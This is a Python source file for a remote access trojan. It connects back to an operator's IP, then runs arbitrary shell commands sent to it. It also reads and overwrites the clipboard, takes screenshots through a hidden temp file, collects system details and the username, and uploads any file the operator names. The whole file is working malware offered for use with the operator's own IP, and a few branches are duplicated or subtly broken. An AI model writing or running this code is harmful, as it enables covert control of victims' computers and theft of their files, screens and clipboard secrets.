import subprocess, sys, os, bz2, platform
from socket import socket, AF_INET, SOCK_STREAM
from PIL import ImageGrab, Image
from getpass import getuser
tcp = socket(AF_INET, SOCK_STREAM)
connection = False
while connection == False:
    try:
        ip = "127.0.0.1" # Here Is My Ip But Use Your IP.
        tcp.connect((ip,1660))
        connection = True
    except:
        continue
while True:
    cmd = tcp.recv(1024)
    cmd = bz2.decompress(cmd).decode().split(" ")
    if cmd[0] == "command":
        proc = subprocess.Popen(" ".join(cmd[1:]),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        result = proc.stdout.read() + proc.stderr.read()
        tcp.send(bz2.compress(result))
    elif cmd[0] == "exit":
        sys.exit()
    elif cmd[0] == "getclip":
        proc = subprocess.Popen("powershell -c \"get-clipboard\"",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        data = proc.stdout.read() + proc.stderr.read()
        if data == b"":
            data = b"Nothing :-)"
        tcp.send(bz2.compress(data))
    elif cmd[0] == "clearclip":
        proc = subprocess.Popen("powershell -c \"set-clipboard\"",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    elif cmd[0] == "setclip":
        clipdata = " ".join(cmd[1:])
        proc = subprocess.Popen(f"powershell -c \"set-clipboard -value \"{clipdata}\"\"",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    elif cmd[0] == "screen":
        temp = os.getenv("temp") + "\\img.jpg"
        img = ImageGrab.grab()
        img.save(temp)
        os.system(f"attrib +h {temp}")
        image_file = open(temp, "rb")
        data = image_file.read()
        image_file.close()
        tcp.sendall(bytes(bz2.compress(bytes(data))))
        os.remove(temp)
    elif cmd[0] == "getuser":
        user = str(getuser()).encode()
        tcp.send(bz2.compress(user))
    elif cmd[0] == "sysinfo":
        if cmd[1] == "short":
            data = platform.uname()
            info = f"""
            Os -> {data.system} {data.release}
            Version -> {data.version}
            Node -> {data.node}
            Machine -> {data.machine}
            CPU -> {data.processor}
            """
            tcp.send(bz2.compress(info.encode()))
        elif cmd[1] == "full":
            proc = subprocess.Popen("systeminfo",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            info = proc.stdout.read() + proc.stderr.read()
            tcp.send(bz2.compress(info))
    elif cmd[0] == "path":
        path = os.getcwd()
        tcp.send(bz2.compress(path.encode()))
    elif cmd[0] == "get":
        try:
            with open(" ".join(cmd[1:]),"rb") as f:
                data = bz2.compress(f.read())
        except FileNotFoundError:
            data = bz2.compress("X_X")
        tcp.send(data)
    elif cmd[0] == "chdir":
        try:
            os.chdir(" ".join(cmd[1:]))
        except FileNotFoundError:
            tcp.send(bz2.compress(b"No"))
        else:
            tcp.send(bz2.compress(b"Down"))
    elif cmd[0] == "check":
        pass
    elif cmd[0] == "get":
        with open(" ".join(cmd[1:]), "rb") as f: data = f.read().encode()
        result = bz2.compress(data)        
        del(data)
        tcp.send(result)